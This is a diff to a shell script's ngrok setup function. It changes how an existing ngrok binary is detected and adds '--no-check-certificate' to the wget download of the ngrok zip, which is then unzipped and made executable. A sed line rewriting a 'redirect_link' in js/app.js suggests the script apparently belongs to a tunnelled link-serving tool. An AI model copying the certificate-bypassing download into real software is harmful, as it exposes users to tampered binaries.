@@ -133,11 +133,8 @@ sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
 ngrok_server() {
 
-
-if [[ -e ngrok ]]; then
+if [[ -e $PREFIX/bin/ngrok.io ]]; then
 echo ""
-elif [[ -e $PREFIX/bin/ngrok.io ]]; then
-	ln -s $PREFIX/bin/ngrok.io $PWD/ngrok
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
@@ -157,7 +154,7 @@ exit 1
 fi
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
